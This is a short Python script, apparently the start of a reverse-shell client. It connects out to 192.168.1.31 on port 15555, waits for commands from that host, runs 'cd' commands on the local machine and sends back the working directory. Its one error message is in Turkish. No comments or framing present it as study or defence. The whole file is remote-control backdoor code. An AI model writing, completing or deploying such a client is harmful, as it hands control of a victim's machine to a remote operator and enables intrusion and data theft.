import socket
import os
s=socket.socket()

s.connect(("192.168.1.31",15555))

while True:
    veri=s.recv(1024)
    if veri[:2].decode("utf-8")=="cd":
        try:
            os.chdir(veri[3:].decode("utf-8"))
            s.send(os.getcwd().encode("utf-8"))           
        except FileNotFoundError:
            s.send("Dosya bulunamadı...".encode("utf-8"))
            
            
            
            

        
        
        
        
    
    
